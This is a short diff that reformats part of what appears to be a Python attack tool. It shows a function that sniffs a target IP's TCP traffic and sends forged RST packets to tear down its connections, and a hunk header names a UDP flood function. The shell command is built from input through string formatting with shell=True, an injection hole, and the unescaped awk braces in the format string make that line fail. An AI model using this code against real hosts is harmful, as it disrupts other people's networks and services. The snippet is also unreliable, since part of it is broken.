@@ -328,13 +328,14 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
 
 # (14) Code to perform drop communication
 def perform_drop_communication(ip_addr=None):
-    
     if not ip_addr:
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
     cmd = "ip a | grep {} | awk '{print $7}'".format(ip_addr)
-    IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
+    IFACE = subprocess.run(
+        cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE
+    ).stdout.strip()
 
     # Create a packet filter to capture packets from the specified IP address
     filter_str = "tcp"
@@ -358,7 +359,11 @@ def perform_drop_communication(ip_addr=None):
                 )
 
                 # Send the RST packet
-                send(IP(src=packet[IP].src, dst=packet[IP].dst) / rst_packet, iface=IFACE, verbose=0)
+                send(
+                    IP(src=packet[IP].src, dst=packet[IP].dst) / rst_packet,
+                    iface=IFACE,
+                    verbose=0,
+                )
 
                 # Print the dropped communication
                 print(
